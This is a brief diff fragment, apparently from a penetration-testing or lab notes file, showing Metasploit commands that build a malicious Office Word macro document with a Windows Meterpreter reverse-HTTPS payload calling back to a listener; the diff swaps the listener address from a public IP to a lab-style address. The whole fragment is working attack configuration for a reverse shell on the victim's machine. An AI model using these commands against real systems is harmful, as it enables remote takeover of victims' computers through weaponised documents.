@@ -135,7 +135,7 @@ exploit -j -z
 
 use exploit/multi/fileformat/office_word_macro 
 set PAYLOAD windows/meterpreter/reverse_https
-set LHOST 159.65.52.124
+set LHOST 10.10.14.22
 set LPORT 4646
 exploit
 ```
